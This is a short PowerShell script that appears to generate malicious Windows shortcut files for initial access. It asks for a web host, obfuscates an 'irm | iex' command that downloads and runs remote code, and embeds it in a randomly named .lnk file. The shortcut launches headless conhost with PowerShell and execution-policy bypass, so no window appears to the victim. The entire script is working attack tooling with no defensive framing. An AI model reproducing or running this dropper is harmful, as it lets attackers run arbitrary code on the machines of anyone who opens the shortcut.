$web = Read-Host "Webhost"
gc obfuscate.ps1|out-string|iex
$id = Get-Random $wordlist
$content = $decryptor_func + (Invoke-PSObfuscation ";&""irm"" ""$web""|&""iex""" -NoJunk) 
$s = (New-Object -c WScript.Shell).CreateShortcut("$id.lnk")
$s.TargetPath = "conhost.exe"
$s.Arguments = "--headless powershell -ep bypass -c '$content'"
$s.Save()